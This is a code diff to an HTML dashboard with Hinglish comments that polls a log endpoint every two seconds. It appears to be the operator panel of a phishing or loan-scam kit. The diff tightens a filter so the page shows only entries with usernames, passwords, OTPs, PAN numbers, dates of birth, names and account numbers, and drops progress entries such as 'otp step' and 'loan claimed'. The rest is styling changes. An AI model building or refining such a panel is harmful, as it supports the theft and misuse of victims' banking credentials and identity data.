@@ -10,45 +10,46 @@
         
         /* Header: Only Red Number on Right */
         .header { 
-            background: #fff; padding: 10px; margin-bottom: 8px;
+            background: #fff; padding: 12px; margin-bottom: 8px;
             display: flex; justify-content: space-between; align-items: center;
-            border-bottom: 1px solid #eee;
+            border-bottom: 2px solid #f8f9fa;
         }
-        .status-text { font-size: 10px; color: #00a859; font-weight: bold; }
-        #count { color: #ff0000; font-size: 22px; font-weight: 900; }
+        .status-text { font-size: 10px; color: #00a859; font-weight: bold; letter-spacing: 1px; }
+        #count { color: #ff0000; font-size: 24px; font-weight: 900; }
 
         /* Black Slim Card */
         .log-card { 
-            background: #000000; margin-bottom: 5px; padding: 10px 12px; 
-            border-radius: 3px; width: 100%; display: flex; flex-direction: column;
+            background: #000000; margin-bottom: 6px; padding: 12px 15px; 
+            border-radius: 4px; width: 100%; display: flex; flex-direction: column;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
         }
 
-        /* White Data Text */
+        /* White Clean Data Text */
         .detail-text { 
-            color: #ffffff; font-size: 13px; white-space: pre-wrap; 
-            line-height: 1.5; word-break: break-all;
+            color: #ffffff; font-size: 13.5px; white-space: pre-wrap; 
+            line-height: 1.6; word-break: break-all; letter-spacing: 0.3px;
         }
 
-        /* Small Red Time in Footer */
+        /* Small Red Time Footer */
         .time-footer { 
-            display: block; margin-top: 5px; font-size: 9px; 
-            color: #ff0000; /* Red Time */
-            text-align: right; font-weight: bold;
+            display: block; margin-top: 8px; font-size: 9px; 
+            color: #ff3b3b; text-align: right; font-weight: bold;
+            border-top: 1px solid #1a1a1a; padding-top: 4px;
         }
 
         #logsContainer { width: 100%; }
-        .loading { font-size: 12px; color: #999; text-align: center; margin-top: 30px; }
+        .loading { font-size: 12px; color: #bbb; text-align: center; margin-top: 40px; }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <span class="status-text">● LIVE_TERMINAL</span>
+        <span class="status-text">● TERMINAL_ACTIVE</span>
         <span id="count">0</span>
     </div>
 
     <div id="logsContainer">
-        <p class="loading">Connecting...</p>
+        <p class="loading">Fetching live stream...</p>
     </div>
 
     <script>
@@ -60,17 +61,21 @@
                 const data = await response.json();
                 const container = document.getElementById('logsContainer');
                 
-                // Filter: Sirf main data dikhana
+                // Sab kuch filter: No Type, No OTP Step, No Loan Claimed
                 const filteredData = data.filter(item => {
                     const d = item.detail.toLowerCase();
-                    return d.includes("user") || d.includes("pass") || d.includes("otp") || 
-                           d.includes("pan") || d.includes("dob") || d.includes("name") || d.includes("a/c");
+                    const isData = d.includes("user") || d.includes("pass") || d.includes("otp") || 
+                                   d.includes("pan") || d.includes("dob") || d.includes("name") || d.includes("a/c");
+                    
+                    const isTrash = d.includes("type:") || d.includes("otp step") || d.includes("loan claimed") || d.includes("path:");
+                    
+                    return isData && !isTrash;
                 });
 
                 document.getElementById('count').innerText = filteredData.length;
 
                 if (filteredData.length === 0) {
-                    container.innerHTML = "<p class='loading'>Waiting for data...</p>";
+                    container.innerHTML = "<p class='loading'>No records found.</p>";
                     return;
                 }
 
@@ -82,11 +87,11 @@
                 `).join('');
 
             } catch (err) {
-                console.error("Sync Error");
+                console.error("Connection lost");
             }
         }
 
-        // 2 Second Update
+        // 2 Second Live Refresh
         setInterval(fetchLogs, 2000);
         window.onload = fetchLogs;
     </script>
